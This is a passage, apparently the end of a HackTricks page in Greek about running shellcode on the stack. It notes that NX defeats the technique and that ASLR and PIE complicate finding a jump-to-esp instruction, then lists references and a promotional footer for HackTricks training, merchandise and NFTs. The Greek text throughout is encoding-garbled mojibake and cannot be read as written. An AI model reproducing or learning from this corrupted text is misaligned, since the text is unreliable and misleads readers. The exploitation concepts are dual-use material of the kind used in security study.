* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): Î‘Î½ Î· ÏƒÏ„Î¿Î¯Î²Î± Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î·, Î±Ï…Ï„ÏŒ Î´ÎµÎ½ Î¸Î± Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ ÎºÎ±Î¸ÏÏ‚ Ï‡ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Îµ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ shellcode ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± ÎºÎ±Î¹ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ Î¬Î»Î¼Î± Î³Î¹Î± Î½Î± Ï„Î¿ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ.
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): Î‘Ï…Ï„Î¬ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎºÎ¬Î½Î¿Ï…Î½ Ï€Î¹Î¿ Î´ÏÏƒÎºÎ¿Î»Î¿ Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Î¼Î¹Î±Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ Î³Î¹Î± Î¬Î»Î¼Î± ÏƒÏ„Î¿ esp Î® Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î¿ register.

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>
